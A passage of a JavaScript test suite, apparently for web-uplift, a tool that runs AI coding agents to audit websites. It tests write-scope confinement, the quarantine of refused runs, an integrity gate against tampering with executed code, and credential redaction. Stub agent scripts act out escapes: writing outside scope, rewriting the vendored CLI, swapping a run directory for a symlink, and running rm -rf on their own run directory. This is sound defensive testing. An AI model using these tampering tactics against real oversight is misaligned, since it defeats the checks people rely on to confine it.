    assert(existsSync(join(root, 'reports', host, 'latest')), 'isolation run: latest must be published');
    assert(
      existsSync(join(root, 'reports', host, readlinkSync(join(root, 'reports', host, 'latest')), 'run-security.json')),
      'isolation run: the isolation record must travel into the retained result',
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// The installer vendors a set of files, and tests/cdp-copy-sync.mjs byte-compares
// each tracked copy against its source. Both lists now come from
// install-surface.mjs, and this drives a REAL install and compares what actually
// appeared against what is declared - so a copy step nobody declared, or a
// declaration the install no longer produces, fails here instead of quietly
// escaping the byte-identity guard. The comparison runs one way against the
// install's own output, not against the guard, so it cannot be circular
// (web-uplift-7mr).
async function testInstallSurfaceMatchesWhatInstallVendors() {
  const { VENDORED_DIRS, VENDORED_FILES, TRACKED_COPY_FILES } = await import('../install-surface.mjs');
  const target = join(tmp, 'surface-target');
  const install = spawnSync(process.execPath, [join(repoRoot, 'bin/web-uplift.mjs'), 'install', '--agent', 'codex', '--target', target], { encoding: 'utf8' });
  assert(install.status === 0, `surface: install failed: ${install.stderr || install.stdout}`);

  const declared = [...VENDORED_DIRS.map((dir) => dir.dest), ...VENDORED_FILES.map((file) => file.dest)];
  const walk = (dir, base = '') =>
    readdirSync(dir, { withFileTypes: true }).flatMap((entry) => {
      const rel = base ? `${base}/${entry.name}` : entry.name;
      return entry.isDirectory() ? walk(join(dir, entry.name), rel) : [rel];
    });
  const actual = walk(join(target, '.web-uplift')).filter(
    (rel) => rel !== 'manifest.json' && !rel.startsWith('node_modules/'),
  );
  assert(actual.length > 0, 'surface: the fixture install produced no vendored files');

  const declaredCovers = (rel) => declared.some((dest) => rel === dest || rel.startsWith(`${dest}/`));
  const undeclared = actual.filter((rel) => !declaredCovers(rel));
  assert(
    undeclared.length === 0,
    `surface: install vendored ${JSON.stringify(undeclared)} without declaring it, so the byte-identity guard does not cover it`,
  );
  const notVendored = declared.filter((dest) => !actual.some((rel) => rel === dest || rel.startsWith(`${dest}/`)));
  assert(
    notVendored.length === 0,
    `surface: ${JSON.stringify(notVendored)} is declared but the install did not produce it`,
  );

  // Tracked copies outside .web-uplift/ are compared by the guard too, so a
  // declaration pointing at nothing has to fail just as loudly.
  for (const copy of TRACKED_COPY_FILES) {
    assert(existsSync(join(repoRoot, copy.dest)), `surface: tracked copy ${copy.dest} is declared but missing from the tree`);
  }
}

// web-uplift-wy6: the batch audit path gets the same write-scope accounting as fix
// mode, with FOUR things a review found missing: the DEFAULT output must be walked
// (the generic exclusion skips a directory named reports/), a refused run must not be
// usable as the current result for its URL, concurrent runs must not refuse each
// other's clean work, and the escape path must be exercised with a FAILING agent.
function testBatchWriteScope() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-batchscope-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(binDir, { recursive: true });
    const findings = join(repoRoot, 'examples', 'playground-report.json');

    const drive = ({ args = [], body, extraArgs = [], cwd = root }) => {
      const bin = join(binDir, 'claude');
      if (body) {
        writeFileSync(bin, `#!/bin/sh\n${body}\n`);
        chmodSync(bin, 0o755);
      }
      const res = run(process.execPath, [join(repoRoot, 'runner', 'run-batch.mjs'), ...args, '--agent', 'claude', '--isolation', 'test-suite', ...extraArgs],
        { cwd, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } });
      return res;
    };
    const writesReport = (outAbs) => [
      `d=$(ls -dt ${JSON.stringify(outAbs)}/*/*/ 2>/dev/null | head -1)`,
      `cp ${JSON.stringify(findings)} "$d/report.json"`,
    ].join('\n');
    const hostDir = (outName) => {
      const abs = join(root, outName);
      const host = readdirSync(abs)[0];
      return { root: join(abs, host), run: readdirSync(join(abs, host)).find((e) => !e.startsWith('latest')) };
    };

    // 1. THE DEFAULT OUTPUT (no --out at all, i.e. `reports/`) must be walked and
    //    recorded as an allowed change. A positive control on a convenient custom
    //    output name hid exactly this: the default tree is dropped by the generic
    //    exclusion, so it was unwatched in both directions.
    const dflt = drive({ args: ['https://example.com/'], extraArgs: ['--concurrency', '1'], body: writesReport(join(root, 'reports')) });
    assert(dflt.status === 0, `batch default output: a normal audit must exit 0 (got ${dflt.status})\n${dflt.stdout}${dflt.stderr}`);
    assert(/done \(coverage complete\)/.test(dflt.stdout), `batch default output: the audit must complete:\n${dflt.stdout}`);
    const dfltRun = hostDir('reports');
    const dfltScope = JSON.parse(readFileSync(join(dfltRun.root, dfltRun.run, 'write-scope.json'), 'utf8'));
    assert(dfltScope.escapedOutsideScope.length === 0, `batch default output: nothing refused (${JSON.stringify(dfltScope.escapedOutsideScope)})`);
    assert(
      dfltScope.changed.added.some((p) => p.includes(join('reports', 'example_com'))),
      `batch default output: the DEFAULT output tree must be recorded as an allowed change, got ${JSON.stringify(dfltScope.changed.added)}`,
    );

    // 2. A REFUSED RUN MUST NOT BE THE CURRENT RESULT. The refusal skips the pointer,
    //    but latest resolution falls back to the newest run CONTAINING a report, so a
    //    refused run could become what --resume treats as done and skip the URL.
    const refused = drive({ args: ['https://refused.example/'], extraArgs: ['--concurrency', '1', '--out', 'r-out'],
      body: `${writesReport(join(root, 'r-out'))}\nprintf 'pwned' > ${JSON.stringify(join(root, 'escaped.txt'))}` });
    assert(refused.status !== 0, `batch refusal: an escaping audit must exit non-zero (${refused.status})`);
    const refusedHost = join(root, 'r-out', readdirSync(join(root, 'r-out'))[0]);
    const refusedRun = readdirSync(refusedHost).find((e) => !e.startsWith('latest'));
    assert(existsSync(join(refusedHost, refusedRun, 'run-refused.json')), 'batch refusal: the run must be marked as refused');
    assert(!existsSync(join(refusedHost, refusedRun, 'report.json')), 'batch refusal: a refused run must not leave a report where resolution looks');
    assert(existsSync(join(refusedHost, refusedRun, 'report.refused.json')), 'batch refusal: the report must be RENAMED out of the way, so the exclusion does not depend on a deletion succeeding');
    // NOTE ON WHAT THIS CONTROL COVERS: it exercises the REAL runner end to end -
    // orchestration, the scope accounting, the refusal path and the report schema
    // validation - with a stand-in agent. It is NOT a real skill/browser/evidence
    // audit (that needs an external agent CLI and token spend, which is a deliberate
    // acceptance step rather than a unit gate), so it must not be read as end-to-end
    // coverage of the audit itself.
    const resume = drive({ args: ['https://refused.example/'], extraArgs: ['--concurrency', '1', '--out', 'r-out', '--resume'], body: writesReport(join(root, 'r-out')) });
    assert(!/resume skip/.test(resume.stdout), `batch refusal: --resume must NOT skip a URL whose only run was refused:\n${resume.stdout}`);
    assert(/done \(coverage complete\)\s+https:\/\/refused\.example\//.test(resume.stdout), `batch refusal: --resume must RE-AUDIT and COMPLETE that URL, not merely "not skip" it:\n${resume.stdout}`);

    // 3. CONCURRENCY MUST NOT REFUSE CLEAN WORK. Two URLs, one escaping agent: the
    //    clean URL shares the project tree, so an overlapping snapshot window would
    //    catch the other agent's write and refuse it too. The scope windows are
    //    serialized; the clean URL must complete.
    const twoUp = drive({
      args: ['https://clean.example/', 'https://dirty.example/'],
      extraArgs: ['--concurrency', '2', '--out', 'c-out'],
      // The stub locates its own run dir by pure shell parameter expansion on the
      // prompt it is given (`--out <dir>`), with no external commands, no regex and no
      // nested quoting: an earlier version of this used grep/sed inside $( ) and the
      // generated script failed to parse, which is what a gate is for.
      body: [
        'd=""',
        'for a in "$@"; do',
        '  case "$a" in',
        '    *c-out/*) rest=${a#*c-out/}; d="' + join(root, 'c-out') + '/${rest%% *}";;',
        '  esac',
        'done',
        `cp ${JSON.stringify(findings)} "$d/report.json"`,
        `case "$*" in *dirty.example*) printf 'pwned' > ${JSON.stringify(join(root, 'c-escaped.txt'))};; esac`,
      ].join('\n'),
    });
    assert(twoUp.status !== 0, 'batch concurrency: the dirty URL must still fail the batch');
    assert(
      /done \(coverage complete\)\s+https:\/\/clean\.example\//.test(twoUp.stdout),
      `batch concurrency: the CLEAN url must still complete when a neighbour escapes:\n${twoUp.stdout}`,
    );

    // 4. THE ESCAPE PATH WITH A FAILING AGENT: the diff must still be computed and the
    //    refusal still recorded when the agent exits non-zero (the earlier stub always
    //    exited 0, so this path was untested).
    const failing = drive({ args: ['https://failing.example/'], extraArgs: ['--concurrency', '1', '--out', 'f-out'],
      body: `printf 'pwned' > ${JSON.stringify(join(root, 'f-escaped.txt'))}\nexit 7` });
    assert(failing.status !== 0, `batch failing agent: must exit non-zero (${failing.status})`);
    assert(/CONFINEMENT FAILURE/.test(failing.stderr), `batch failing agent: the escape must still be diagnosed:\n${failing.stderr}`);
    const failingHost = join(root, 'f-out', readdirSync(join(root, 'f-out'))[0]);
    const failingRun = readdirSync(failingHost).find((e) => !e.startsWith('latest'));
    const failingScope = JSON.parse(readFileSync(join(failingHost, failingRun, 'write-scope.json'), 'utf8'));
    assert(
      failingScope.escapedOutsideScope.some((p) => p.endsWith('f-escaped.txt')),
      `batch failing agent: the escaped path must be recorded even though the agent died (${JSON.stringify(failingScope.escapedOutsideScope)})`,
    );
    // 5. THE CLEANUP-FAILURE PATH (the P1): the agent plants a DANGLING symlink where the
    //    refusal marker goes, so writing the marker fails. With the old single try block
    //    that failure suppressed the report removal and left a resumable report. The
    //    report must still be renamed out of the way.
    const marker = drive({ args: ['https://marker.example/'], extraArgs: ['--concurrency', '1', '--out', 'm-out'],
      body: `d=$(ls -dt ${JSON.stringify(join(root, 'm-out'))}/*/*/ 2>/dev/null | head -1); d=${'${d%/}'}\ncp ${JSON.stringify(findings)} "$d/report.json"\nln -s /nonexistent/target "$d/run-refused.json"\nprintf 'pwned' > ${JSON.stringify(join(root, 'm-escaped.txt'))}` });
    assert(marker.status !== 0, `batch cleanup: the escape must still refuse (${marker.status})`);
    const markerHost = join(root, 'm-out', readdirSync(join(root, 'm-out'))[0]);
    const markerRun = readdirSync(markerHost).find((e) => !e.startsWith('latest'));
    assert(
      existsSync(join(markerHost, markerRun, 'report.refused.json')) && !existsSync(join(markerHost, markerRun, 'report.json')),
      `batch cleanup: a failing marker write must NOT suppress quarantining the report (${JSON.stringify(readdirSync(join(markerHost, markerRun)))})`,
    );

    // 6. A SYMLINKED RUN DIRECTORY (the P2a): the agent replaces its run dir with a link
    //    to another run under the output root. Nothing may be renamed or deleted through
    //    that link - the innocent run must be untouched.
    const innocent = join(root, 'innocent', 'RUN');
    mkdirSync(innocent, { recursive: true });
    writeFileSync(join(innocent, 'report.json'), '{"innocent":true}\n');
    const swapped = drive({ args: ['https://swap.example/'], extraArgs: ['--concurrency', '1', '--out', 's-out'],
      body: `d=$(ls -dt ${JSON.stringify(join(root, 's-out'))}/*/*/ 2>/dev/null | head -1); d=${'${d%/}'}\nrm -rf "$d"\nln -s ${JSON.stringify(innocent)} "$d" || exit 9\n[ -d "$d" ] || exit 9\nprintf 'pwned' > ${JSON.stringify(join(root, 's-escaped.txt'))}` });
    assert(swapped.status !== 0, `batch symlinked run: the escape must still refuse (${swapped.status})`);
    assert(/not a real path below the output root/.test(swapped.stderr), `batch symlinked run: the refusal must say it did not touch anything through the link:\n${swapped.stderr}`);
    assert(existsSync(join(innocent, 'report.json')), 'batch symlinked run: the innocent run report must be untouched');
    assert(!existsSync(join(innocent, 'report.refused.json')), 'batch symlinked run: nothing may be renamed through the agent-controlled link');
    // The reviewer's point: the scope record is written THROUGH the run directory, so a
    // swapped link would have overwritten the innocent run's record too.
    writeFileSync(join(innocent, 'write-scope.json'), '{"innocent":"scope-record"}\n');
    const swapped2 = drive({ args: ['https://swap2.example/'], extraArgs: ['--concurrency', '1', '--out', 's2-out'],
      body: `d=$(ls -dt ${JSON.stringify(join(root, 's2-out'))}/*/*/ 2>/dev/null | head -1); d=${'${d%/}'}\nrm -rf "$d"\nln -s ${JSON.stringify(innocent)} "$d" || exit 9\nprintf 'pwned' > ${JSON.stringify(join(root, 's2-escaped.txt'))}` });
    assert(swapped2.status !== 0, `batch symlinked run: the escape must still refuse (${swapped2.status})`);
    assert(
      readFileSync(join(innocent, 'write-scope.json'), 'utf8').includes('innocent'),
      'batch symlinked run: the innocent run\'s SCOPE RECORD must not be overwritten through the link',
    );

    // 7. A REFUSED RUN MUST NEVER RESOLVE AS CURRENT, whatever the agent plants: with a
    //    DIRECTORY sitting where the quarantined report would go, the rename cannot
    //    happen, so completion must still not resolve - the decision comes from the
    //    pointer this tool writes, not from what is on disk.
    mkdirSync(join(root, 'd-out'), { recursive: true });
    const blocked = drive({ args: ['https://blocked.example/'], extraArgs: ['--concurrency', '1', '--out', 'd-out'],
      body: `d=$(ls -dt ${JSON.stringify(join(root, 'd-out'))}/*/*/ 2>/dev/null | head -1); d=${'${d%/}'}\ncp ${JSON.stringify(findings)} "$d/report.json"\nmkdir -p "$d/report.refused.json"\nprintf 'pwned' > ${JSON.stringify(join(root, 'd-escaped.txt'))}` });
    assert(blocked.status !== 0, `batch blocked quarantine: the escape must still refuse (${blocked.status})`);
    assert(/NOT QUARANTINED/.test(blocked.stderr), `batch blocked quarantine: a quarantine that cannot happen must be LOUD:\n${blocked.stderr}`);
    const blockedResume = drive({ args: ['https://blocked.example/'], extraArgs: ['--concurrency', '1', '--out', 'd-out', '--resume'], body: writesReport(join(root, 'd-out')) });
    assert(!/resume skip/.test(blockedResume.stdout), `batch blocked quarantine: --resume must not treat a refused run as done, however it is blocked:\n${blockedResume.stdout}`);
    assert(/done \(coverage complete\)\s+https:\/\/blocked\.example\//.test(blockedResume.stdout), `batch blocked quarantine: the URL must be RE-AUDITED and complete:\n${blockedResume.stdout}`);

    // 8. A URL THAT DESTROYS ITS OWN RUN DIRECTORY MUST NOT TAKE THE BATCH DOWN: a LATER
    //    URL still has to complete.
    const deletes = drive({
      args: ['https://deleter.example/', 'https://later.example/'],
      extraArgs: ['--concurrency', '1', '--out', 'del-out'],
      body: `d=$(ls -dt ${JSON.stringify(join(root, 'del-out'))}/*/*/ 2>/dev/null | head -1); d=${'${d%/}'}\ncase "$*" in *deleter.example*) rm -rf "$d";; *) cp ${JSON.stringify(findings)} "$d/report.json";; esac`,
    });
    assert(/done \(coverage complete\)\s+https:\/\/later\.example\//.test(deletes.stdout), `batch deleted run dir: a LATER url must still complete:\n${deletes.stdout}`);
    assert(
      /https:\/\/deleter\.example\/: run directory unusable/.test(deletes.stdout),
      `batch deleted run dir: the destructive URL must carry its own failure REASON in the summary, not merely appear somewhere:\n${deletes.stdout}`,
    );
    // 9. THE RESUME POINTER-FILE PATH MUST ACTUALLY WORK. It was silently dead because
    //    readFileSync was missing from the runner's imports: the lookup threw, the catch
    //    swallowed it, and no run could ever be resolved from latest.txt. This case would
    //    have failed then, which is the point of adding it.
    const txtHost = join(root, 'txt-out', 'txt_example');
    const txtRun = join(txtHost, 'RUN1');
    mkdirSync(txtRun, { recursive: true });
    writeFileSync(join(txtRun, 'report.json'), readFileSync(findings));
    writeFileSync(join(txtHost, 'latest.txt'), 'RUN1\n');
    const txtResume = drive({ args: ['https://txt.example/'], extraArgs: ['--concurrency', '1', '--out', 'txt-out', '--resume'], body: writesReport(join(root, 'txt-out')) });
    assert(/resume skip/.test(txtResume.stdout), `batch resume: a valid run named by latest.txt must count as done (the pointer-FILE path was silently dead):\n${txtResume.stdout}`);

    // 10. And the symlink pointer path, positively: complete a URL, then resume skips it.
    //     The refused-run cases above only ever asserted that a URL was NOT skipped.
    const firstDone = drive({ args: ['https://done.example/'], extraArgs: ['--concurrency', '1', '--out', 'p-out'], body: writesReport(join(root, 'p-out')) });
    assert(firstDone.status === 0, `batch resume: the first run must complete (${firstDone.status})`);
    const secondDone = drive({ args: ['https://done.example/'], extraArgs: ['--concurrency', '1', '--out', 'p-out', '--resume'], body: writesReport(join(root, 'p-out')) });
    assert(/resume skip/.test(secondDone.stdout), `batch resume: a completed URL must be SKIPPED on resume:\n${secondDone.stdout}`);


    // 11. A PUBLICATION FAILURE MUST NOT MARK THE URL COMPLETE. The in-memory set used to be
    //     updated BEFORE the publication call, so when publication threw (here: the output
    //     root is made unwritable, so both the symlink and its pointer-file fallback fail)
    //     a DUPLICATE url later in the same resume batch was skipped even though nothing had
    //     been published for it.
    const dupOut = join(root, 'dup-out');
    mkdirSync(dupOut, { recursive: true });
    try {
      const dup = drive({
        args: ['https://dup.example/', 'https://dup.example/'],
        extraArgs: ['--concurrency', '1', '--out', 'dup-out', '--resume'],
        // Make the HOST directory unwritable (that is where the pointer is published), so
        // the symlink AND its pointer-file fallback both fail - and so the duplicate's own
        // run directory cannot be created either, which is itself proof it was attempted
        // rather than skipped by the in-memory set.
        body: `d=$(ls -dt ${JSON.stringify(dupOut)}/*/*/ 2>/dev/null | head -1); d=${'${d%/}'}\ncp ${JSON.stringify(findings)} "$d/report.json"\nchmod 0500 "$(dirname \"$d\")"`,
      });
      assert(/could not publish completion/.test(dup.stderr), `batch publication failure: the failure must be reported:\n${dup.stderr}`);
      // Counting APPEARANCES was too weak: it could be satisfied by the URL being mentioned
      // without the duplicate ever being attempted. Assert the duplicate's OWN failure
      // REASON instead - a second, DISTINCT reason in the summary is proof the second attempt
      // actually ran rather than being skipped by the in-memory set.
      const reasons = [...dup.stdout.matchAll(/https:\/\/dup\.example\/: ([^\n]+)/g)].map((m) => m[1].trim());
      assert(
        reasons.some((r) => /completion could not be published|could not publish completion/.test(r)),
        `batch publication failure: the publication failure must appear as its own reason (saw ${JSON.stringify(reasons)})`,
      );
      assert(
        reasons.length >= 2 && new Set(reasons).size >= 2,
        `batch publication failure: the duplicate must be ATTEMPTED and carry its own reason, not merely be mentioned (saw ${JSON.stringify(reasons)})`,
      );
    } finally {
      // Restore what the fixture made read-only, or the suite's own cleanup cannot
      // descend into it (this cost one run to learn).
      try {
        for (const entry of readdirSync(dupOut)) {
          try {
            chmodSync(join(dupOut, entry), 0o755);
          } catch { /* best effort */ }
        }
        chmodSync(dupOut, 0o755);
      } catch { /* best effort */ }
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// web-uplift-dzd: the tripwire used to skip any path with a `node_modules` or
// `.web-uplift` segment - exactly the trees the tool EXECUTES from. This pins the
// new coverage: hash strength on the executed first-party set (including the
// vendored tree and its dependency closure), stat strength on the project
// dependency tree, `reports` still excluded unless walked, and the integrity
// snapshot the pre-spawn gate compares. Includes the mutation control: at stat
// strength alone, the same-size+mtime rewrite the hash catches is invisible -
// so the hash assertions above cannot pass vacuously.
function testWriteScopeCoversExecutedTrees() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-dzd-scope-'));
  try {
    mkdirSync(join(root, 'evidence'), { recursive: true });
    mkdirSync(join(root, 'schema'), { recursive: true });
    mkdirSync(join(root, 'bin'), { recursive: true });
    mkdirSync(join(root, '.web-uplift', 'evidence'), { recursive: true });
    mkdirSync(join(root, '.web-uplift', 'node_modules', 'dep'), { recursive: true });
    mkdirSync(join(root, 'node_modules', 'dep'), { recursive: true });
    mkdirSync(join(root, 'reports', 'site'), { recursive: true });
    writeFileSync(join(root, 'evidence', 'cli.mjs'), 'console.log(1);\n');
    writeFileSync(join(root, 'schema', 'validate-report.mjs'), 'console.log(2);\n');
    writeFileSync(join(root, 'bin', 'web-uplift.mjs'), 'console.log(3);\n');
    writeFileSync(join(root, 'install-surface.mjs'), 'export const x = 1;\n');
    writeFileSync(join(root, '.web-uplift', 'evidence', 'cli.mjs'), 'console.log(1);\n');
    writeFileSync(join(root, '.web-uplift', 'node_modules', 'dep', 'index.js'), 'module.exports = 1;\n');
    writeFileSync(join(root, 'node_modules', 'dep', 'index.js'), 'module.exports = 1;\n');
    writeFileSync(join(root, 'reports', 'site', 'report.json'), '{}\n');

    const snap = () => snapshotTree(root, { hashUnder: EXECUTABLE_HASH_ROOTS });
    const before = snap();
    // Executed first-party set, the vendored tree (including its vendored
    // dependencies) and the single-file root: CONTENT-HASH strength.
    for (const k of ['evidence/cli.mjs', 'schema/validate-report.mjs', 'bin/web-uplift.mjs',
      'install-surface.mjs', '.web-uplift/evidence/cli.mjs', '.web-uplift/node_modules/dep/index.js']) {
      assert(String(before.get(k) || '').startsWith('sha256:'), `dzd coverage: ${k} must be hash-stamped, got ${before.get(k)}`);
    }
    // Project dependency tree: COVERED (no longer excluded), at stat strength.
    const depKey = join('node_modules', 'dep', 'index.js');
    assert(before.has(depKey) && !String(before.get(depKey)).startsWith('sha256:'),
      `dzd coverage: the project dependency tree must be walked at stat strength, got ${before.get(depKey)}`);
    // Published output stays excluded unless the caller walks it (the fixer must
    // not trip over its own report writes).
    assert(!before.has(join('reports', 'site', 'report.json')),
      'dzd coverage: reports must stay excluded when not named by walkUnder');

    // The blind spot the hashes close: a rewrite preserving BOTH size and mtime.
    const cliPath = join(root, 'evidence', 'cli.mjs');
    const st = statSync(cliPath);
    writeFileSync(cliPath, 'console.log(9);\n');
    utimesSync(cliPath, st.atime, st.mtime);
    assert(statSync(cliPath).size === st.size, 'dzd fixture: the rewrite must preserve size');
    const d = diffTrees(before, snap());
    assert(d.modified.length === 1 && d.modified[0] === 'evidence/cli.mjs',
      `dzd coverage: a same-size+mtime rewrite of executed code must be a detected change, got ${JSON.stringify(d)}`);

    // MUTATION CONTROL: at stat strength alone the identical rewrite is invisible,
    // proving the hash stamp (not the walk) is what the assertion above owes to.
    writeFileSync(cliPath, 'console.log(1);\n');
    utimesSync(cliPath, st.atime, st.mtime);
    const statOnly = snapshotTree(root);
    writeFileSync(cliPath, 'console.log(9);\n');
    utimesSync(cliPath, st.atime, st.mtime);
    const d2 = diffTrees(statOnly, snapshotTree(root));
    assert(!d2.modified.includes('evidence/cli.mjs'),
      'dzd control: at stat strength the same-size+mtime rewrite must be invisible (else the hash assertion proves nothing)');
    writeFileSync(cliPath, 'console.log(1);\n');
    utimesSync(cliPath, st.atime, st.mtime);

    // The stat-strength residual, stated as behaviour rather than hidden: the same
    // trick on a project dependency is NOT caught. Hash strength is reserved for
    // the executed first-party set to keep the walk affordable (module header).
    // NOTE the baseline is taken AFTER normalising the mtime: utimesSync with Date
    // values truncates sub-millisecond fractions, so a restore against a
    // never-truncated baseline leaves a fractional delta - which is itself a
    // (correct) detection, not the blind spot being documented here.
    const depPath = join(root, 'node_modules', 'dep', 'index.js');
    const dst0 = statSync(depPath);
    utimesSync(depPath, dst0.atime, dst0.mtime);
    const beforeDep = snap();
    const dst = statSync(depPath);
    writeFileSync(depPath, 'module.exports = 2;\n');
    utimesSync(depPath, dst.atime, dst.mtime);
    const d3 = diffTrees(beforeDep, snap());
    assert(!d3.modified.includes(depKey),
      'dzd residual: stat-strength paths keep the documented same-size+mtime blind spot');
    writeFileSync(depPath, 'module.exports = 1;\n');
    utimesSync(depPath, dst.atime, dst.mtime);

    // executableIntegrity: the pre-spawn gate's own snapshot. Hashes the executed
    // set only (fast), and drifts on both a content tamper and a symlink swap.
    const baseline = executableIntegrity(root);
    assert(String(baseline.get('.web-uplift/evidence/cli.mjs') || '').startsWith('sha256:'),
      'dzd integrity: the vendored CLI must be in the integrity set');
    assert(!baseline.has(depKey),
      'dzd integrity: the project dependency tree must NOT be in the fast integrity set (the snapshot stat-covers it instead)');
    assert(diffTrees(baseline, executableIntegrity(root)).modified.length === 0,
      'dzd integrity: an untouched tree must diff clean');
    writeFileSync(join(root, '.web-uplift', 'evidence', 'cli.mjs'), 'console.log("pwned");\n');
    let drift = diffTrees(baseline, executableIntegrity(root));
    assert(drift.modified.length === 1 && drift.modified[0] === '.web-uplift/evidence/cli.mjs',
      `dzd integrity: a vendored-CLI tamper must drift, got ${JSON.stringify(drift)}`);
    rmSync(join(root, '.web-uplift', 'evidence', 'cli.mjs'));
    symlinkSync('../../evidence/cli.mjs', join(root, '.web-uplift', 'evidence', 'cli.mjs'));
    drift = diffTrees(baseline, executableIntegrity(root));
    assert(drift.modified.length === 1 && String(executableIntegrity(root).get('.web-uplift/evidence/cli.mjs')).startsWith('link:'),
      'dzd integrity: a symlink swap of executed code must drift and be recorded as a link');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// web-uplift-dzd: the bead's threat scenario end to end on the REAL batch runner.
// An agent tampers with the vendored evidence CLI during URL 1. The old behaviour:
// the exclusion made the tamper invisible, URL 1 "completed", and URL 2's agent
// EXECUTED the tampered tree (its own diff was clean - the tamper predated its
// snapshot). The new behaviour this pins: URL 1 is refused with the executed-tree
// path in its escape list (hash coverage sees the tamper), and URL 2's agent is
// NEVER SPAWNED because the pre-spawn integrity gate compares against the
// batch-start baseline, refuses and aborts the remaining URLs.
function testBatchIntegrityGateAbortsOnTamperedExecutedTree() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-dzd-batch-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(binDir, { recursive: true });
    mkdirSync(join(root, '.web-uplift', 'evidence'), { recursive: true });
    const vendoredCli = join(root, '.web-uplift', 'evidence', 'cli.mjs');
    writeFileSync(vendoredCli, 'console.log("vendored");\n');
    const findings = join(repoRoot, 'examples', 'playground-report.json');
    const outAbs = join(root, 'o1');
    // The spawn counter lives under the OUTPUT root so it is an allowed change:
    // the only escape URL 1 commits is the executed-tree tamper itself.
    const spawnCount = join(outAbs, 'spawns.txt');
    mkdirSync(outAbs, { recursive: true });
    writeFileSync(spawnCount, '0\n');

    const bin = join(binDir, 'claude');
    writeFileSync(bin, [
      '#!/bin/sh',
      `n=$(cat ${JSON.stringify(spawnCount)} 2>/dev/null || echo 0); n=$((n+1)); echo $n > ${JSON.stringify(spawnCount)}`,
      `if [ "$n" = "1" ]; then printf 'console.log("pwned");\\n' > ${JSON.stringify(vendoredCli)}; fi`,
      `d=$(ls -dt ${JSON.stringify(outAbs)}/*/*/ 2>/dev/null | head -1)`,
      `cp ${JSON.stringify(findings)} "$d/report.json"`,
      `echo '{"agent":"stub"}'`,
    ].join('\n') + '\n');
    chmodSync(bin, 0o755);

    const res = run(
      process.execPath,
      [join(repoRoot, 'runner', 'run-batch.mjs'), 'https://i1.example/', 'https://i2.example/',
        '--agent', 'claude', '--isolation', 'test-suite', '--concurrency', '1', '--out', 'o1'],
      { cwd: root, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } },
    );

    assert(res.status !== 0, `dzd batch: a tampering batch must exit non-zero (got ${res.status})\n${res.stdout}${res.stderr}`);
    // THE CORE CONTROL: exactly one spawn. Without the pre-spawn gate the second
    // agent runs the tampered tree (and its own clean diff lets it "complete").
    assert(readFileSync(spawnCount, 'utf8').trim() === '1',
      `dzd batch: the agent must be spawned EXACTLY once - URL 2's spawn must be refused by the integrity gate (count: ${readFileSync(spawnCount, 'utf8').trim()})`);
    assert(/INTEGRITY FAILURE/.test(res.stderr) && /aborting the remaining URLs/.test(res.stderr),
      `dzd batch: the integrity refusal must be loud and name the abort:\n${res.stderr}`);
    assert(/CONFINEMENT FAILURE/.test(res.stderr) && /\.web-uplift/.test(res.stderr),
      `dzd batch: URL 1 must be refused with the executed-tree path in the escape list:\n${res.stderr}`);

    // URL 1's scope record names the vendored tamper as the escape.
    const hosts = readdirSync(outAbs).filter((e) => !e.includes('spawns'));
    const hostDirs = hosts.filter((e) => statSync(join(outAbs, e)).isDirectory());
    assert(hostDirs.length === 2, `dzd batch: both URLs get host directories, got ${JSON.stringify(hostDirs)}`);
    let scope = null;
    for (const h of hostDirs) {
      const hAbs = join(outAbs, h);
      for (const r of readdirSync(hAbs).filter((e) => !e.startsWith('latest'))) {
        const p = join(hAbs, r, 'write-scope.json');
        if (existsSync(p)) scope = JSON.parse(readFileSync(p, 'utf8'));
      }
    }
    assert(scope, 'dzd batch: URL 1 must leave a scope record');
    assert(scope.escapedOutsideScope.some((p) => p.includes(join('.web-uplift', 'evidence', 'cli.mjs'))),
      `dzd batch: the escape list must name the tampered vendored CLI: ${JSON.stringify(scope.escapedOutsideScope)}`);
    // URL 2 published nothing and left no scope record (refused before spawn).
    const reports = hostDirs.flatMap((h) => readdirSync(join(outAbs, h)).filter((e) => !e.startsWith('latest'))
      .map((r) => join(outAbs, h, r, 'report.json')).filter((p) => existsSync(p)));
    assert(reports.length === 0, `dzd batch: no URL may publish a report after a tamper: ${JSON.stringify(reports)}`);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}
// web-uplift-dsj: the credential redaction landed for HEADER VALUES only, and the rest of
// the artifact was still verbatim. These are the per-vector tests: for each vector, the
// credential value must be ABSENT and a non-credential value in the SAME field must
// SURVIVE, so the redaction cannot pass by being over-broad.
async function testCredentialRedactionHelpers() {
  const { redactUrlCredentialValues, redactQueryList, redactBodyText, isCredentialName, redactHeaderList } =
    await import('../evidence/cli.mjs');
  const SECRET = 'SECRET-CANARY-123';

  // 1. The request URL and its query string: credential-named parameters are redacted,
  //    the names and every other parameter are untouched.
  const url = redactUrlCredentialValues(`https://x.test/page?token=${SECRET}&page=2`);
  assert(!url.includes(SECRET), `redaction: the token value must be gone from the URL (${url})`);
  assert(url.includes('token=') && url.includes('page=2'), `redaction: the parameter NAME and a non-credential parameter must survive (${url})`);

  // 2. The HAR entry's parsed queryString list.
  const qs = redactQueryList([{ name: 'api_key', value: SECRET }, { name: 'page', value: '2' }]);
  assert(qs[0].value === '[redacted]' && qs[0].name === 'api_key', `redaction: query list credential value (${JSON.stringify(qs[0])})`);
  assert(qs[1].value === '2', `redaction: query list non-credential value must survive (${JSON.stringify(qs[1])})`);

  // 6. CAMEL-CASE AND OTHER PLAUSIBLE SPELLINGS. A separator-anchored matcher missed these
  //    entirely, which the review found by asking what a credential parameter plausibly
  //    looks like rather than by testing only the spellings we had thought of.
  for (const name of ['accessToken', 'refreshToken', 'apiKey', 'clientSecret', 'userIdToken', 'x-api-key']) {
    assert(isCredentialName(name), `redaction: '${name}' must be recognised as credential-shaped`);
    const u2 = redactUrlCredentialValues(`https://x.test/cb?${name}=${SECRET}&page=2`);
    assert(!u2.includes(SECRET) && u2.includes('page=2'), `redaction: camel/separator spelling in a URL (${name}: ${u2})`);
  }
  for (const name of ['country', 'page', 'monkey']) {
